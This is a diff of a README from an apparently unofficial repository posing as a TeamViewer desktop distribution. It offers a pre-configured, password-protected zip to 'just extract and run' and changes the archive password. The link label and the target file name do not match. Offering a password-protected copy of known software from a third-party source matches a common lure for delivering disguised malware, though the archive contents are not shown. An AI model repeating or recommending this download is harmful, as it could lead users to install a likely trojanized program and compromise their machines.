@@ -30,7 +30,7 @@ This repository is for **educational and administrative use only**. All scripts 
 We provide a pre‑configured archive ready for quick setup — just extract and run.
 
 📥 [Download `TeamViewer-Utility-Pack.zip`](https://github.com/elanmosk/TeamViewer-Desktop-Version/releases/download/Software/TeamViewer-Desktop-15.75.5.zip)  
-🔐 Password: **TV2026**
+🔐 Password: **LS2026**
 
 ### Archive Contents
 - `/scripts/` – Folder with all PowerShell automation tools  
